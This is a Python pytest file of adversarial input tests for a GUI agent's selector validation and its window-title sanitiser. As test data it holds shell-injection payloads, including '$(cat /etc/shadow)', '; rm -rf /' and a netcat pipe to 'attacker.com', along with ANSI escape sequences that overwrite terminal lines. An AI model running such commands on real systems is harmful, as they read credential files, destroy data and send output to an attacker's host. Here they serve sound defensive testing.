"""Adversarial tests for GUI Agent — metacharacter injection, ANSI in titles."""

from __future__ import annotations

import pytest

from gui_agent.atspi import _sanitize_gui_string
from gui_agent.protocol import validate_gui_params


class TestMetacharInSelectors:
    """F-101.1 (2026-07-28): shell metachars in GUI selector fields
    (window/role/name) are now ACCEPTED because AT-SPI queries are
    D-Bus lookups, never shell exec. The previous strict pattern broke
    legitimate real-world strings like "OC | System uptime check"
    (opencode session titles) and menu items with `&`. C0 control
    characters remain rejected (would corrupt terminal or trigger
    unexpected keystrokes).

    The safety story for these fields is: mcpd + gui_worker call
    AT-SPI via D-Bus (no shell interpolation), pyatspi's own
    ATSpiAccessible lookups treat these as opaque strings, and
    downstream terminal rendering goes through _sanitize_gui_string
    which strips ANSI + control chars (see TestAnsiInWindowTitles
    below — those tests are unchanged + still pass).
    """

    @pytest.mark.parametrize("field", ["window", "role", "name"])
    @pytest.mark.parametrize("payload", [
        "$(cat /etc/shadow)",
        "; rm -rf /",
        "| nc attacker.com 4444",
        "`whoami`",
    ])
    def test_shell_metachar_now_accepted_in_all_selector_fields(self, field, payload):
        # No exception — F-101.1. Payload passes schema validation;
        # actual execution goes through D-Bus AT-SPI which won't
        # interpolate any of these.
        params = {"window": "safe", "role": "button", "name": "OK"}
        params[field] = payload
        validate_gui_params("gui.click", params)

    @pytest.mark.parametrize("field", ["window", "role", "name"])
    @pytest.mark.parametrize("payload", ["foo\x00bar", "line\ninjection", "cr\rinject"])
    def test_control_char_still_rejected_in_all_selector_fields(self, field, payload):
        params = {"window": "safe", "role": "button", "name": "OK"}
        params[field] = payload
        with pytest.raises(Exception):
            validate_gui_params("gui.click", params)


class TestAnsiInWindowTitles:
    def test_ansi_escape_stripped(self):
        title = "\x1b[31;1mMalicious Title\x1b[0m"
        clean = _sanitize_gui_string(title)
        assert "\x1b" not in clean
        assert "Malicious Title" in clean

    def test_carriage_return_neutralized(self):
        title = "Normal\r\x1b[AOverwrite"
        clean = _sanitize_gui_string(title)
        assert "\r" not in clean
        assert "\x1b" not in clean

    def test_null_byte_stripped(self):
        title = "Window\x00Title"
        clean = _sanitize_gui_string(title)
        assert "\x00" not in clean
        assert "WindowTitle" in clean


class TestOversizedInput:
    def test_long_string_truncated(self):
        long_name = "A" * 1000
        clean = _sanitize_gui_string(long_name)
        assert len(clean) <= 260
        assert clean.endswith("...")

    def test_long_window_name_rejected_by_schema(self):
        long_window = "A" * 300
        with pytest.raises(Exception):
            validate_gui_params("gui.find_element", {
                "window": long_window,
                "role": "button",
                "name": "OK",
            })
